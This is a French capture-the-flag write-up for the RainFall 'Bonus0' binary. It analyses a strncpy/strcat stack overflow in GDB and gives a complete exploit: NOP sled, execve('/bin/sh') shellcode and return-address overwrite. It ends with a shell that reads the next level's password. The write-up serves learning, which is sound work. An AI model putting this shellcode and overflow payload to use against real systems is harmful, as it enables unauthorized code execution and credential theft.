# Bonus0

Analysons les fonctions en détails :

### Fonction p
Cette fonction affiche un tiret, lit des données de l'entrée standard, et copie les données dans un buffer fourni en paramètre. Elle est vulnérable à un débordement de tampon pour plusieurs raisons :

Taille de lecture fixe et grande : read(0, localBuffer, 0x1000) lit 4096 octets, la taille complète du buffer localBuffer.
Écrasement potentiel dans strncpy : Même si strncpy limite la copie à 20 caractères (0x14 en hexadécimal), aucun caractère nul n'est explicitement ajouté pour terminer la chaîne, sauf si la chaîne source est plus courte que 20 caractères.

### Fonction pp
Cette fonction orchestre le flux principal des données utilisateur, traitant deux entrées séparées avec la fonction p, puis les concatene dans un buffer passé en paramètre. Les problèmes sont:

Utilisation de strcpy et strcat : Ces fonctions ne vérifient pas la taille du buffer de destination, conduisant directement à des débordements de tampon si les données sources sont trop grandes.

### Fonction main

Cette fonction prépare un buffer de 54 octets et appelle pp pour manipuler les données utilisateur. Elle affiche ensuite le résultat final.

Utilisons GDB pour trouver la faille potentielle.

```
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXYYYYZZZZ
 -
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXYYYYZZZZ
aaaabbbbccccddddeeeeaaaabbbbccccddddeeee??? aaaabbbbccccddddeeee???

Program received signal SIGSEGV, Segmentation fault.
0x64636363 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff740	0xbffff740
ebp            0x63626262	0x63626262
esi            0x0	0
edi            0x0	0
eip            0x64636363	0x64636363
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
On constate avec le pattern utilisé, qui il y a un segfault. ebp et eip sont effet ecrasé. Le programme a sauté vers 'dccc' (en little endian donc 'cccd' dans le pattern). On en conclut que le programme est redirigé a +9 de la deuxième chaine entrée.

Nous allons mettre notre shellcode dans la premiere chaine de caractère entrée avec un nopsled suffisant. Grâce a un breakpoint apres le premier read, nous trouvons l'adresse du buffer où le programme sera redirigé.

```
Starting program: /home/user/bonus0/bonus0
 -
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXYYYYZZZZ

Breakpoint 2, 0x080484e6 in p ()
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
=> 0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.
(gdb) x/100x $esp-100
0xbfffe60c:	0xb7e9e0fb	0xb7fd1a20	0x0000000a	0x00000000
0xbfffe61c:	0x00000000	0x0804824c	0x080498e4	0xb7fd28b8
0xbfffe62c:	0xb7e9293c	0xb7fd1a20	0xb7e338d8	0x00000003
0xbfffe63c:	0x00000000	0x00000000	0xb7fd0ff4	0x00000000
0xbfffe64c:	0x00000000	0xbffff688	0xb7ff26b0	0xbffff688
0xbfffe65c:	0x00001000	0xbfffe680	0xb7f0a213	0xb7fd0ff4
0xbfffe66c:	0x080484e6	0x00000000	0xbfffe680	0x00001000
0xbfffe67c:	0x00000000	0x61616161	0x62626262	0x63636363
0xbfffe68c:	0x64646464	0x65656565	0x66666666	0x67676767
0xbfffe69c:	0x68686868	0x69696969	0x6a6a6a6a	0x6b6b6b6b
0xbfffe6ac:	0x6c6c6c6c	0x6d6d6d6d	0x6e6e6e6e	0x6f6f6f6f
0xbfffe6bc:	0x70707070	0x71717171	0x72727272	0x73737373
0xbfffe6cc:	0x74747474	0x75757575	0x76767676	0x77777777 <== nous allons choisir cette adresse
0xbfffe6dc:	0x78787878	0x79797979	0x7a7a7a7a	0x41414141
0xbfffe6ec:	0x42424242	0x43434343	0x44444444	0x45454545
0xbfffe6fc:	0x46464646	0x47474747	0x48484848	0x49494949
0xbfffe70c:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xbfffe71c:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0x51515151
0xbfffe72c:	0x52525252	0x53535353	0x54545454	0x55555555
0xbfffe73c:	0x56565656	0x57575757	0x59585858	0x5a595959
0xbfffe74c:	0x0a5a5a5a	0x00000000	0x00000000	0x00000000
0xbfffe75c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe76c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe77c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe78c:	0x00000000	0x00000000	0x00000000	0x00000000
```

Nous pouvons à présent construire notre shellcode, comme suit :
NopeSled + shellcode en 1ere entrée.
Décalage de 9 + addresse du 1er buffer + 7 pour eviter que la chaîne ne se termine (+ de 20 caractères)

```
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xcc\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 -
 -
????????????????????AAAAAAAAA????BBBBBBB??? AAAAAAAAA????BBBBBBB???
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

